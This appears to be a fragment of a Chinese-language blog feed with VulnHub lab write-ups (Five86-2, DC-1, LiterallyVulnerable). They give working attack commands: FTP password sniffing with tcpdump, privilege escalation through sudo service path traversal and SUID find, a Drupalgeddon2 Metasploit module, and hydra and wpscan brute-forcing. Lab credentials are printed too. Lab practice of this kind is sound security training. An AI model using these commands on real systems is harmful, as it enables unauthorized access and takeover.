+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE  SERVICE  VERSION</span><br><span class="line">20/tcp closed ftp-data</span><br><span class="line">21/tcp open   ftp      ProFTPD 1.3.5e					无相关漏洞</span><br><span class="line">80/tcp open   http     Apache httpd 2.4.41 ((Ubuntu))	无相关漏洞</span><br><span class="line"><span class="comment">#####################</span></span><br><span class="line">barney		spooky1		FTP：No	WordPress：OK</span><br><span class="line">peter</span><br><span class="line">admin</span><br><span class="line">gillian</span><br><span class="line">stephen		apollo1		FTP：No	WordPress：OK</span><br><span class="line"><span class="comment">######################</span></span><br><span class="line">barney		:x:1001:1001:Barney Sumner:/home/barney:/bin/bash</span><br><span class="line">stephen		:x:1002:1002:Stephen Morris:/home/stephen:/bin/bash</span><br><span class="line">peter		:x:1003:1003:Peter Hook:/home/peter:/bin/bash</span><br><span class="line">gillian		:x:1004:1004:Gillian Gilbert:/home/gillian:/bin/bash</span><br><span class="line">richard		:x:1005:1005:Richard Starkey:/home/richard:/bin/bash</span><br><span class="line">paul		:x:1006:1006:Paul McCartney:/home/paul:/bin/bash</span><br><span class="line">john		:x:1007:1007:John Lennon:/home/john:/bin/bash</span><br><span class="line">george		:x:1008:1008:George Harrison:/home/george:/bin/bash</span><br><span class="line"><span class="comment">#####################</span></span><br><span class="line">得到密码的两个账号无法登陆 FTP</span><br><span class="line"></span><br><span class="line"><span class="comment">#####################									&lt;----- 未验证/未收集</span></span><br><span class="line">Linux kernel 信息未收集（内核提权）</span><br><span class="line">FTP 没有起到作用（存在即有理）</span><br><span class="line"></span><br><span class="line"><span class="comment">####################</span></span><br><span class="line">两个账户存在于 /etc/passwd 下，是否可以切换用户</span><br><span class="line">barney 密码错误</span><br><span class="line">stephen 可以切换</span><br><span class="line"><span class="comment">####################</span></span><br><span class="line">barney		spooky1		FTP：No	WordPress：OK	su：NO</span><br><span class="line">peter</span><br><span class="line">admin</span><br><span class="line">gillian</span><br><span class="line">stephen		apollo1		FTP：No	WordPress：OK	su：OK	&lt;----- 切入点</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-02-26-17-38-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-17-38-13屏幕截图"></p>
+<h2 id="身份转换"><a href="#身份转换" class="headerlink" title="身份转换"></a>身份转换</h2><p><code>su stephen</code> ：切换用户</p>
+<p>不存在 <code>sudo</code> 权限，主目录暂无利用信息，卡住了</p>
+<p>查了一下 WriteUp，抓 <code>FTP</code> 的包，有明文密码：</p>
+<p>查看相关进程：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -aux | grep <span class="string">"ftp"</span></span><br><span class="line"></span><br><span class="line">systemd+  1376  0.0  0.9 119972  9484 pts/0    Ss+  02:32   0:00 proftpd: (accepting connections)</span><br><span class="line">paul      2883  0.0  0.0   2600   732 ?        Ss   05:38   0:00 /bin/sh -c /home/paul/ftp_upload.sh &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">paul      2884  0.0  0.0   2600   864 ?        S    05:38   0:00 /bin/sh /home/paul/ftp_upload.sh</span><br><span class="line">paul      2885  0.0  0.2   3224  2036 ?        S    05:38   0:00 ftp -n 172.18.0.10</span><br><span class="line">1000      2886  0.0  0.8 133072  8136 pts/0    S+   05:38   0:00 proftpd: paul - 172.18.0.1: STOR file.txt</span><br><span class="line">stephen   2889  0.0  0.0   6296   924 pts/0    S+   05:38   0:00 grep ftp</span><br></pre></td></tr></table></figure>
+
+<p>查看 FTP 监听的网卡：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip addr</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">3: br-eca3858d86bf: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    link/ether 02:42:9e:df:8d:0f brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-eca3858d86bf</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::42:9eff:fedf:8d0f/64 scope link</span><br></pre></td></tr></table></figure>
+
+<p>抓包，得到密码：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">timeout 50 tcpdump -i br-eca3858d86bf -w pack.pcap</span><br><span class="line">tcpdump -r pack.pcap</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-02-27-13-39-28%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-27 13-39-28屏幕截图"> </p>
+<p><img src="2020-02-27-14-40-50%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-27 14-40-50屏幕截图"> </p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>登录 <code>paul</code> 查看可以 <code>sudo</code> 执行的程序：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries <span class="keyword">for</span> paul on five86-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User paul may run the following commands on five86-2:</span><br><span class="line">    (peter) NOPASSWD: /usr/sbin/service</span><br></pre></td></tr></table></figure>
+
+<p><code>/usr/sbin/service</code> 提权：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u peter service ../../bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>查看可以 <code>sudo</code> 执行的程序：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries <span class="keyword">for</span> peter on five86-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User peter may run the following commands on five86-2:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">    (root) NOPASSWD: /usr/bin/passwd</span><br></pre></td></tr></table></figure>
+
+<p>修改 <code>root</code> 密码，登录 <code>root</code> 查看 <code>flag</code> ：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo passwd root</span><br><span class="line"></span><br><span class="line">su -</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-02-27-14-54-14%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-27 14-54-14屏幕截图"> </p>
+<hr>
+<p>卡在了 <code>FTP</code> 抓包的位置，还是经验不足</p>
+<p>前期收集的信息必定是有用的，<code>FTP</code> 使用明文传输密码，只需要抓包，就可以得到</p>
+<p>查看系统正在运行的进程也要加入信息收集里面</p>
+]]></content>
+      <categories>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>vulnhub</tag>
+        <tag>OSCP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-1</title>
+    <url>/2020/03/19/DC-1/</url>
+    <content><![CDATA[<blockquote>
+<p>2020-03-17</p>
+</blockquote>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp open ssh OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">80/tcp open http Apache httpd 2.2.22 ((Debian))</span><br><span class="line">111/tcp open rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">################## ALL Port ###########################3</span></span><br><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">22/tcp open ssh OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0) </span><br><span class="line">| ssh-hostkey:</span><br><span class="line">| 1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">| 2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA) </span><br><span class="line">|_ 256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp open http Apache httpd 2.2.22 ((Debian)) |_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">|/themes//CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">|/INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">111/tcp open rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo:</span><br><span class="line">| program version port/proto service</span><br><span class="line">...</span><br><span class="line">35460/tcp open status 1 (RPC <span class="comment">#100024)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="web-目录枚举"><a href="#web-目录枚举" class="headerlink" title="web 目录枚举"></a>web 目录枚举</h3><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta">############# /robots.txt ################ #</span></span><br><span class="line"><span class="meta"># robots.txt</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># This file is to prevent the crawling and indexing of certain parts</span></span><br><span class="line"><span class="meta"># of your site by web crawlers and spiders run by sites like Yahoo!</span></span><br><span class="line"><span class="meta"># and Google. By telling these <span class="string">"robots"</span> where not to go on your site,</span></span><br><span class="line"><span class="meta"># you save bandwidth and server resources.</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># This file will be ignored unless it is at the root of your host:</span></span><br><span class="line"><span class="meta"># Used:</span></span><br><span class="line"><span class="meta"># Ignored: #</span></span><br><span class="line"><span class="meta"># For more</span></span><br><span class="line"><span class="meta"># http:<span class="comment">//www.robotstxt.org/wc/robots.html #</span></span></span><br><span class="line"><span class="meta"># For syntax checking, see:</span></span><br><span class="line"><span class="meta"># http:<span class="comment">//www.sxw.org.uk/computing/robots/check.html</span></span></span><br><span class="line">User-agent: *</span><br><span class="line">Crawl-delay: <span class="number">10</span></span><br><span class="line"><span class="meta"># Directories</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/includes/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/misc/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/modules/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/profiles/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/scripts/</span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/themes/</span></span><br><span class="line"><span class="meta"># Files</span></span><br><span class="line"><span class="symbol">Disallow:</span> /CHANGELOG.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /cron.php</span><br><span class="line"><span class="symbol">Disallow:</span> /INSTALL.mysql.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /INSTALL.pgsql.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /INSTALL.sqlite.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /install.php </span><br><span class="line"><span class="symbol">Disallow:</span> /INSTALL.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /LICENSE.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /MAINTAINERS.txt</span><br><span class="line"><span class="symbol">Disallow:</span> /update.php </span><br><span class="line"><span class="symbol">Disallow:</span> /UPGRADE.txt </span><br><span class="line"><span class="symbol">Disallow:</span> /xmlrpc.php</span><br><span class="line"><span class="meta"># Paths (clean URLs) </span></span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/admin/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/comment/</span>reply/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/filter/</span>tips/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/node/</span>add/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/search/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/user/</span>register/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/user/</span>password/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/user/</span>login/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/user/</span>logout/</span><br><span class="line"><span class="meta"># Paths (no clean URLs)</span></span><br><span class="line"><span class="symbol">Disallow:</span> /?q=admin/ </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=comment<span class="meta-keyword">/reply/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=filter<span class="meta-keyword">/tips/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=node<span class="meta-keyword">/add/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=search/ </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=user<span class="meta-keyword">/password/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=user<span class="meta-keyword">/register/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=user<span class="meta-keyword">/login/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=user<span class="meta-keyword">/logout/</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-17-11-17-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-11-17-23屏幕截图"> </p>
+<p>逐一访问，得到如下信息：</p>
+<ul>
+<li>CMS：Drupal</li>
+<li>版本：7.X</li>
+</ul>
+<p><img src="2020-03-17-11-48-03%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-11-48-03屏幕截图"> </p>
+<h2 id="漏洞利用-Getshell"><a href="#漏洞利用-Getshell" class="headerlink" title="漏洞利用(Getshell)"></a>漏洞利用(Getshell)</h2><p>搜索历史漏洞，找一个可正常利用的，有的会因为各种问题无法使用</p>
+<p>在 MSF 上搜到几个，挑个利用：</p>
+<p><code>use exploit/unix/webapp/drupal_drupalgeddon2</code> </p>
+<p><img src="2020-03-17-11-48-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-11-48-51屏幕截图"> </p>
+<p><img src="2020-03-17-12-12-26%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-12-26屏幕截图"> </p>
+<p><img src="2020-03-17-12-18-40%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-18-40屏幕截图"></p>
+<h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><ul>
+<li>登陆用户：www-data</li>
+<li><code>Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux</code> </li>
+<li><code>/etc/passwd</code> <ul>
+<li><code>flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</code> </li>
+</ul>
+</li>
+</ul>
+<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>查看当前目录，得到一个 flag， <code>flag4</code>用户下得到第二个 flag</p>
+<p><img src="2020-03-17-12-29-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-29-33屏幕截图"></p>
+<p>flag1 提示找 Drupal 的配置文件，百度一下 Drupal 的配置文件一般位于 <code>/var/www/sites/default/</code> </p>
+<p>文件名是 <code>settings.php</code> </p>
+<p> <code>find</code> 一下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -name settings.php 2&gt;/dev/null </span><br><span class="line">/var/www/sites/default/settings.php</span><br></pre></td></tr></table></figure>
+
+<p>查看后得到 flag2 和一组用户名密码，登陆数据库得到两个用户名(第三个是我自己加的)，密码被加密，暂时没有作用</p>
+<p><img src="%E6%88%AA%E5%B1%8F2020-03-1712.36.32.png" alt="截屏2020-03-1712.36.32"> </p>
+<p><img src="2020-03-17-12-45-25%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-45-25屏幕截图"> </p>
+<p><img src="2020-03-17-13-16-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-13-16-07屏幕截图"> </p>
+<p><img src="%E6%88%AA%E5%B1%8F2020-03-1916.11.12.png" alt="截屏2020-03-1916.11.12"> </p>
+<h3 id="密码枚举"><a href="#密码枚举" class="headerlink" title="密码枚举"></a>密码枚举</h3><p>flag2 提到了密码爆破不是唯一的方法，可能是通过修改数据库内某个用户的密码，不想这么麻烦</p>
+<p>听歌的时候想到了还有个 flag4 用户，既然存在，那肯定有其道理，试试能不能枚举<br><code>hydra</code> 爆破 ssh，因为刚装的系统，密码字典还没下载，就先用 <code>john</code> 的，还真得到了密码</p>
+<p><img src="2020-03-17-14-25-48%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-14-25-48屏幕截图"> </p>
+<h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h2><p>登录 ssh，查看 SUID ，<code>find</code> 提权</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/find	<span class="comment"># &lt;---</span></span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/pt_chown </span><br><span class="line">/usr/lib/openssh/ssh-keysign </span><br><span class="line">/usr/lib/eject/dmcrypt-get-device </span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper </span><br><span class="line">/sbin/mount.nfs</span><br></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="%E6%88%AA%E5%B1%8F2020-03-1715.10.08.png" alt="截屏2020-03-1715.10.08"> </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag4@DC-1:~$ find ./ -<span class="built_in">type</span> f -name flag4.txt -<span class="built_in">exec</span> <span class="string">"whoami"</span> \; </span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag4@DC-1:~$ find ./ -<span class="built_in">type</span> f -name flag4.txt -<span class="built_in">exec</span> <span class="string">"/bin/sh"</span> \;</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># cat thefinalflag.txt</span></span><br></pre></td></tr></table></figure>
+
+<p>都提权了，其他 flag 也就无所谓了</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">flag</span></span><br><span class="line"><span class="selector-tag">flag2</span></span><br><span class="line"><span class="selector-tag">flag4</span></span><br><span class="line"><span class="selector-tag">thefinalflag</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>vulnhub</tag>
+        <tag>OSCP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>LiterallyVulnerable</title>
+    <url>/2020/03/19/LiterallyVulnerable/</url>
+    <content><![CDATA[<blockquote>
+<p>2020-03-08 14:26 — 2020-03-09</p>
+</blockquote>
+<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Flags</span>: <span class="number">3</span> (local.txt, user.txt &amp; root.txt)</span><br><span class="line">Difficulty <span class="attribute">Level</span>: Initial Shell (Easy) - Privileges Escalation (Intermediate)</span><br><span class="line"><span class="attribute">Website</span>: <span class="attribute">https</span>:<span class="comment">//ebryx.com</span></span><br><span class="line"><span class="attribute">Hint</span>: Maybe, you hasted and left some open holes unchecked?</span><br><span class="line">Literally Vulnerable is supposed to give beginners a taste of real-world scenarios and OSCP machines at the same time! It was inspired highly by the <span class="variable">@DC</span> series.</span><br><span class="line"></span><br><span class="line">You're supposed to know the big three (EEEs) Enumeration, Exploitation &amp; Escalation of pentesting to pwn the machine. The machine is supposed to be beginner-friendly and the difficulty level is Easy-Intermediate depending on your knowledge. You need to have enough information about Linux file types &amp; permissions for privileges escalation.</span><br><span class="line"></span><br><span class="line">Technical <span class="attribute">Information</span>:</span><br><span class="line">Just download, extract and load the .vmx file in VMware Workstation (tested on VMware Workstation <span class="number">15</span>.x.x)</span><br><span class="line">The adapter is currently NAT, networking is configured for DHCP and IP will get assigned automatically</span><br><span class="line"><span class="attribute">Contact</span>:</span><br><span class="line">You can either contact me on twitter <span class="variable">@syed__umar</span> or linkedin (/in/syedumararfeen/) for hints!</span><br><span class="line">There are three flags in the <span class="attribute">machine</span>: local.txt, user.txt &amp; root.txt. You're supposed to grab all three in order to completely pwn the machine. Hope you like the machine, best of luck! :)</span><br><span class="line"></span><br><span class="line">I'll try my best to continue with the series!</span><br><span class="line">--------</span><br><span class="line"><span class="attribute">From </span>: <span class="attribute">https</span>:<span class="comment">//www.vulnhub.com/entry/ua-literally-vulnerable,407/</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali：172.16.252.129</span><br><span class="line">目标：172.16.252.1/24</span><br></pre></td></tr></table></figure>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机存活：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -n -sn -T5 -v 172.16.252.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>
+
+<p>目标端口服务：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -n -Pn -sV -O 172.16.252.131</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br></pre></td></tr></table></figure>
+
+<p>全部端口：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">21/tcp open ftp vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r-- 1 ftp ftp 325 Dec 04 13:05 backupPasswords </span><br><span class="line">| ftp-syst:</span><br><span class="line">| 	STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">| Connected to ::ffff:172.16.252.129</span><br><span class="line">| Logged <span class="keyword">in</span> as ftp</span><br><span class="line">| TYPE: ASCII</span><br><span class="line">| No session bandwidth <span class="built_in">limit</span></span><br><span class="line">| Session timeout <span class="keyword">in</span> seconds is 300</span><br><span class="line">| Control connection is plain text</span><br><span class="line">| Data connections will be plain text</span><br><span class="line">| At session startup, client count was 1</span><br><span class="line">| vsFTPd 3.0.3 - secure, fast, stable </span><br><span class="line">|_End of status</span><br><span class="line">22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) </span><br><span class="line">| ssh-hostkey:</span><br><span class="line">| 2048 2f:26:5b:e6:ae:9a:c0:26:76:26:24:00:a7:37:e6:c1 (RSA)</span><br><span class="line">| 256 79:c0:12:33:d6:6d:9a:bd:1f:11:aa:1c:39:1e:b8:95 (ECDSA) </span><br><span class="line">|_ 256 83:27:d3:79:d0:8b:6a:2a:23:57:5b:3c:d7:b4:e5:60 (ED25519)</span><br><span class="line">80/tcp open http nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: WordPress 5.3</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Not so Vulnerable &amp;<span class="comment">#8211; Just another WordPress site </span></span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">65535/tcp open http </span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br></pre></td></tr></table></figure>
+
+<p>开启的端口：21、22、80、65535</p>
+<h3 id="FTP-匿名登陆"><a href="#FTP-匿名登陆" class="headerlink" title="FTP 匿名登陆"></a>FTP 匿名登陆</h3><p>FTP 可以匿名访问，得到几个密码，暂不知用途：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*<span class="variable">$eGRIf7v38s</span>&amp;p7 </span><br><span class="line">yP$*SV09YOrx7mY </span><br><span class="line">GmceC&amp;oOBtbnFCH </span><br><span class="line">3!IZguT2piU8X<span class="variable">$c</span> </span><br><span class="line">P&amp;s%F1D4<span class="comment">#KDBSeS</span></span><br><span class="line"><span class="variable">$EPid</span>%J2L9LufO5 </span><br><span class="line">nD!mb*aHON&amp;76&amp;G </span><br><span class="line">$*Ke7q2ko3tqoZo </span><br><span class="line">SCb<span class="variable">$I</span>^gDDqE34fA </span><br><span class="line">Ae%tM0XIWUMsCLp</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-08-14-48-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-48-33屏幕截图"></p>
+<p> <img src="2020-03-08-14-49-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-49-20屏幕截图">  </p>
+<h3 id="Web-目录枚举"><a href="#Web-目录枚举" class="headerlink" title="Web 目录枚举"></a>Web 目录枚举</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">80/tcp open http nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: WordPress 5.3</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: <span class="keyword">Not</span> so Vulnerable &amp;#8211; Just another WordPress site </span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">65535/tcp open http </span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu<span class="built_in"> Default </span>Page: It works</span><br></pre></td></tr></table></figure>
+
+<p>80 端口： nginx + Wordpress</p>
+<p>65535端口：Apache</p>
+<p>控制台显示资源请求错误多，可以看到它是从 <code>literally.vulnerable</code> 请求资源，可以设置 DNS：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"172.16.252.131    literally.vulnerable"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-08-14-54-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-54-43屏幕截图"></p>
+<p>先扫描 65535 端口，逐一访问，得到 <code>phpcms</code> 页面，访问需要密码，<code>wpsacn</code> 枚举</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch.py -u <span class="string">"http://172.16.252.131:65535"</span> -e php --random-agents -w /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-08-15-13-12%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-15-13-12屏幕截图"> </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.252.131:65535/phpcms/ --enumerate</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] maybeadmin</span><br><span class="line">| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] notadmin</span><br><span class="line">| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
+
+<p>得到两个用户名，使用前面得到的几个密码枚举爆破，碰运气，得到一组用户名密码：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.252.131:65535/phpcms/ -U users.txt -P backupPasswords</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[i] Valid Combinations Found:</span><br><span class="line">| Username: maybeadmin, Password:<span class="variable">$EPid</span>%J2L9LufO5</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-08-16-25-38%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-16-25-38屏幕截图"></p>
